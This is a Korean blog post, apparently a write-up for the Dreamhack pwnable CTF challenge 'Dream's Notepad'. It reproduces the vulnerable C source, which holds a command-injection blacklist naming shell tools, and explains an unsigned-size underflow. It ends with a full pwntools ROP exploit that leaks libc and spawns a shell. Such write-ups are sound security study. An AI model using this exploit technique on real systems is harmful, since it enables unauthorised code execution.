---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN Dream's Notepad"
excerpt: "드림핵 포너블 Dream's Notepad 문제풀이"
tags: [Dreamhack, pwnable, ctf, writeup]
math: true
date: 2023-02-08 18:30
---

드림핵 포너블 Dream's Notepad 문제이다. 이 문제를 다운받아 보면 바이너리와 소스코드만 주어진다. 문제 환경은 공개되어 있지 않다.

문제 출제자의 의도는 rtc기법을 사용하라고 일부러 그런것 같은데... rtc를 까먹고 ROP 노가다를 했다. 일단 소스코드를 살펴보자.

```c
//gcc -o Notepad Notepad.c -fno-stack-protector
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void Initalize(){
   setvbuf(stdin, (char *)NULL, _IONBF, 0);
   setvbuf(stdout, (char *)NULL, _IONBF, 0);
   setvbuf(stderr, (char *)NULL, _IONBF, 0);
}

void main()
{
    Initalize();

    puts("Welcome to Dream's Notepad!\n");

    char title[10] = {0,};
    char content[64] = {0,};

    puts("-----Enter the content-----");
    read(0, content, sizeof(content) - 1);

    for (int i = 0; content[i] != 0; i++)
    {
        if (content[i] == '\n')
        {
            content[i] = 0;
            break;
        }
    }

    if(strstr(content, ".") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "/") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, ";") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "*") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "cat") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "echo") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "flag") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "sh") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "bin") != NULL) {
        puts("It can't be..");
        return;
    }

    char tmp[128] = {0,};

    sprintf(tmp, "echo %s > /home/Dnote/note", content);
    system(tmp);
    
    FILE* p = fopen("/home/Dnote/note", "r");
    unsigned int size = 0;
    if (p > 0)
    {
        fseek(p, 0, SEEK_END);
        size = ftell(p) + 1;
        fclose(p);
        remove("/home/Dnote/note");
    }

    char message[256];
    
    puts("\n-----Leave a message-----");
    read(0, message, size - 1);

    puts("\nBye Bye!!:-)");
}
```

첫번째로 read 함수를 통해 63만큼의 문자열을 입력 받고 블랙리스트 방식으로 문자열을 검사한다. 문제를 풀고 다른 분들의 풀이를 보니 커멘드 인젝션만으로 푸신 분들도 있었다.

블랙리스트 검사를 통과하면 echo를 통해 입력한 문자열을 쉘에 출력하고 출력한 값을 /home/Dnote/note에 저장한다. 이후 system함수를 통해 /home/Dnote/note에 저장된 데이터를 실행한다. 그 다음으로 fopen을 통해 /home/Dnote/note 파일을 오픈하는데 파일이 존재할 경우 size 변수에 파일 사이즈 +1을 해주고 파일을 삭제한다. 파일이 없으면 size는 초기화 상태인 0으로 고정된다.

이후 256사이즈의 버퍼에 read 함수를 통해 입력 받는데 입력 가능한 사이즈는 size-1이다. 여기서 unsigned int와 signed int변환 간에 생기는 취약점이 있다. 위의 fopen으로 오픈한 파일이 존재하지 않으면 size 변수는 0을 가지고 있는데 여기서 -1을 해 사이즈를 지정한다. 이때 보수 연산을 통해 결국 read가 읽을 수 있는 값은 int의 가장 큰 수가 된다. 따라서 버퍼 오버플로우를 일으킬 수 있다.

---

내가 작성한 익스플로잇을 간단히 설명해보겠다. 

우선 버퍼 오버플로우가 가능하려면 /home/Dnote/note 파일이 존재하지 않아야 한다. 따라서 백틱( ` )을 이용해 오류를 발생시켜 파일이 생성되지 않도록 했다. 백틱은 쌍을 이뤄 사용해야 한다. 하나만 사용되면 오류가 발생해 백틱을 열었으면 백틱을 한번 더 입력 해 닫아줘야 한다.

ROP를 통해서 read_got를 put_plt 함수로 출력하고 이후 다시 main함수로 돌아온다. gdb를 통해 확인한 결과 rbp-0x1e0를 통해 read 한 데이터를 입력 받고 있었다. 0x1e0를 dec로 바꾸면 480이고 sfp를 포함하면 488만큼 메모리를 덮어줘야 한다. 이후 pop rdi; ret 가젯을 사용했다.

출력된 read 함수 주소를 이용해 libc base 주소를 계산하고 libc의 system함수 주소와 bin/sh 주소를 찾아 다시 버퍼 오버플로우를 통해 쉘을 실행시켰다.

이런 방법에 문제는 해당 문제의 환경을 모르기 때문에 환경에 따른 libc 오프셋이 바뀔 수 있다는 것디아. 실제로 우분투 16 18 20 22 버전의 libc를 각각 전부 돌려 쉘을 획득 할 수 있었다.

문제를 풀긴 풀었지만... 정석대로 풀려면 rtc 공격을 활용해야 한다.


```python
from pwn import *
context.update(arch='amd64', os='linux')

c = remote("host3.dreamhack.games", 12708);
#c = process("./Notepad")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

c.sendafter(b"-----Enter the content-----\n", b"`")
#pop rdi; ret 0x400c73
pr = 0x400c73
read_got = 0x602040
put_plt = 0x400730
main = 0x400957

payload = p64(pr)+p64(read_got)+p64(put_plt)+p64(main)
payload = b"a"*488 + payload
c.sendafter(b"-----Leave a message-----\n", payload)

c.recvuntil(b"Bye Bye!!:-)\n")
libc_base = u64(c.recv(6)+b"\x00\x00")-libc.sym['read']
print("libc_base : "+hex(libc_base))

system = libc_base + libc.sym['system']
print(f"system : {hex(system)}")
binsh = libc_base+list(libc.search(b'/bin/sh'))[0]
print(f"binsh : {hex(binsh)}")

payload2 = p64(pr)+p64(binsh)+p64(system)
payload2 = b"a"*488 + payload2

c.sendafter(b"-----Enter the content-----\n", b"`")

c.sendafter(b"-----Leave a message-----\n", payload2)
c.interactive()

```